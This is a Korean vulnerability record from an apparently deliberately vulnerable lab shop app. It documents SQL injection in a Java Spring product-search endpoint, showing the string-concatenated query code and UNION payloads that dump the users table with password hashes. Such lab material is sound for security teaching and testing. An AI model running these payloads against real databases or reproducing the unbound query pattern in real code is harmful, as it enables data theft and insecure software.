# VULN-005 상품 검색/필터 SQL 인젝션 (001의 java 짝)

- 대상 스택: java-spring
- 심각도: Critical
- 분류: A05:2025 Injection (SQL Injection)

## 위치

`apps/java-spring/src/main/java/com/vulnlab/shop/service/ProductService.java`, `GET /api/products` — `q`, `category` 및 의류 전환 시 추가된 필터 파라미터 `gender`, `color`, `material`을 파라미터 바인딩 없이 native SQL 문자열에 직접 이어붙여 `EntityManager.createNativeQuery()`로 실행. VULN-001(node)과 동일한 엔드포인트/트리거 지점의 java 버전.

```java
StringBuilder sql = new StringBuilder("SELECT * FROM products WHERE 1=1");
if (hasQuery) sql.append(" AND LOWER(name) LIKE LOWER('%").append(query).append("%')");
if (hasCategory) sql.append(" AND category = '").append(category).append("'");
if (hasGender) sql.append(" AND gender = '").append(gender).append("'");
if (hasColor) sql.append(" AND color = '").append(color).append("'");
if (hasMaterial) sql.append(" AND material = '").append(material).append("'");
entityManager.createNativeQuery(sql.toString(), Product.class).getResultList();
```

> 의류 카탈로그(`feature/apparel-catalog`, `docs/features/26-apparel-catalog.md`)에서 필터
> 파라미터 `gender/color/material`이 추가되며 인젝션 표면이 넓어졌다. `minPrice/maxPrice`는
> `Long.parseLong`으로 캐스팅, `inStock`은 고정 문자열이라 인젝션 대상이 아니다.

## 트리거 방법

```
GET /api/products?color=nomatch' OR '1'='1     → 조건 우회, 전체 상품 반환 (표면 확인)
GET /api/products?category=x' UNION SELECT id,name,description,price,image_url,category,brand,sku,gender,color,material,stock,option_name,option_values,created_at FROM users--
```

`products`는 이제 15컬럼(id,name,description,price,image_url,category,brand,sku,**gender,color,material**,stock,option_name,option_values,created_at)이므로, 컬럼 수를 맞춘 UNION 페이로드로 `users` 테이블(패스워드 해시 포함)을 덤프할 수 있다.

## 영향

- 모든 사용자의 bcrypt 해시(`password_hash`)를 포함한 임의 테이블 전체 덤프 가능. 같은 원리로 이 앱 DB의 다른 테이블도 추출 가능(일반화된 정보 유출). VULN-001(node)과 동일한 영향의 java 버전.

## 증거 (재현 확인)

(진단 단계에서 채움) — Phase 2(Burp 진단)에서 재현 예정. node 짝(VULN-001)은 2026-08-25 재현 확인됨.

## 조치 상태: 미조치 (의도된 취약점)
